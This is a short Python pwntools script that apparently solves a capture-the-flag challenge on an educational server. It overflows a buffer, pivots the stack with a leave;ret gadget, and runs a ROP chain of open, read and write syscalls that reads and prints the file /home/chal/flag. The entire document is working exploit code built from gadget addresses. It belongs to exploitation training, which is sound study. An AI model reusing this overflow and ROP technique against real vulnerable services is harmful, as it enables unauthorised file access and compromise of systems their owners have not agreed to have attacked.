#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10005)

ROP_addr = 0x4e3360
fn_addr = 0x4e3340

pop_rdi = 0x4038b3 # pop rdi ; ret   
pop_rsi = 0x402428 # pop rsi ; ret
pop_rdx = 0x40176f # pop rdx ; ret ?
pop_rax = 0x45db87 # pop rax ; ret
syscall = 0x4284b6 # syscall ; ret 
pop_rdx_rbx = 0x493a2b # pop rdx ; pop rbx ; ret ;
leave = 0x40190c # leave ; ret


#open("/home/chal/flag",0)
#read(3, fn_addr, 0x30)
#write(1, fn_addr, 0x30)

#ROP chain
ROP = flat(
    pop_rdi, fn_addr,
    pop_rsi, 0,
    pop_rax, 2,
    syscall,

    pop_rdi, 3,
    pop_rsi, fn_addr,
    pop_rdx_rbx , 0x30, 0,
    pop_rax, 0,
    syscall,


    pop_rdi, 1,
    pop_rax, 1,
    syscall,
)


r.sendafter(b'Give me filename: ', b'/home/chal/flag\x00')
r.sendafter(b'Give me ROP: ', b'A'*0x8 + ROP)
r.sendafter(b'Give me overflow: ', b'A'*0x20 + p64(ROP_addr) + p64(leave))
FLAG = r.recvall()
print(FLAG)
